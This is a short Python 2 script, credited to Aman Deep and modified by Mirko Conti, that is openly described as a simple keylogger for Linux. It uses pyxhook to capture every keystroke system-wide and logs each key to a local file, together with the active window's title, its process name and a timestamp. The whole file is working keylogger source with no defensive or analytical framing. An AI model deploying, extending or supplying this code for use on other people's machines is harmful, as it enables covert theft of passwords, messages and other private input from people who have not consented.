"""
Copyright (c) 2015, Aman Deep
All rights reserved.


A simple keylogger witten in python for linux platform
All keystrokes are recorded in a log file.

The program terminates when plus key(+) is pressed

Modified by Mirko Conti.

"""

import pyxhook
from time import gmtime, strftime

#change this to your log file's path
log_file='file.log'
#name of the current focused window
current_window=""
#var of the open file
of=""
#debug boolean, to print in the console too
debug=True

def printOnFile(string):
	global of
	of=open(log_file,'a')
	of.write(string)
	
#for debug use
def printOnConsole(string):
	if debug:
		print string
	
#get current date time
def getDate():
	return strftime("%Y-%m-%d %H:%M:%S : ", gmtime())
    
#when a button is pressed 
def OnKeyPressConsol(event): 
	global current_window
	key = ""
	if event.Ascii==0:
		key=" %s" % event.Key
	else:
		key=" %s" % event.Key
	
	if current_window==event.WindowName:
		printOnFile(key)
		printOnConsole(key)
	else:
		current_window = event.WindowName
		log = "\n\n" + "-"*75 + "\n# " + getDate() + event.WindowName + " [ " + event.WindowProcName + " ]" + "\n" + "-"*75 + "\n" + key 
		printOnFile(log)
		printOnConsole(log)
	if event.Ascii==43: #43 +
		of.close()
		new_hook.cancel()    
	    
#main function	  
if __name__ == '__main__':
	#instantiate HookManager class
	new_hook=pyxhook.HookManager()
	#hook the keyboard
	new_hook.HookKeyboard()
	#listen to all keystrokes
	new_hook.KeyDown=OnKeyPressConsol
	#start the session
	new_hook.start()
	
